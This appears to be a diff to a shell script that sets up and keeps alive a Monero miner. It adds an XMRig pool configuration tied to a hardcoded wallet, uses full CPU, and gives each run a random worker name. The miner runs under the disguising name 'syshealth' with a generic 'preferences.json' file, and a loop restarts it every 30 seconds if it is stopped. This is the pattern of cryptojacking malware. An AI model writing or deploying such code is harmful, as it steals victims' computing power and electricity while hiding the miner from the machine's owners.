@@ -4,6 +4,7 @@
 
 # --- CONFIGURE THESE ---
 WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
+POOL_URL="gulf.moneroocean.stream:10128"
 CPU_PCT=100
 # Generate a random worker name each run (e.g., worker-<6 random chars>)
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
@@ -37,12 +38,23 @@ fi
 # Create config directory if needed
 mkdir -p "$CONFIG_DIR"
 
-# Generate preferences.json
+# Generate preferences.json (XMRig compatible config )
 cat > "$PREFS_FILE" <<EOF
 {
-  "wallet": "$WALLET",
-  "cpu_pct": $CPU_PCT,
-  "worker_name": "$WORKER_NAME",
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": $CPU_PCT
+  },
+  "pools": [
+    {
+      "url": "$POOL_URL",
+      "user": "$WALLET.$WORKER_NAME",
+      "pass": "x",
+      "keepalive": true,
+      "tls": false
+    }
+  ],
   "log-file": "$SCRIPT_DIR/xmrig.log"
 }
 EOF
@@ -77,5 +89,5 @@ while true; do
     echo "[all_in_one] syshealth not running. Restarting..."
     nohup "$SCRIPT_DIR/syshealth" --config="$PREFS_FILE" >> "$LOGFILE" 2>&1 &
   fi
-  sleep 300
+  sleep 30
 done
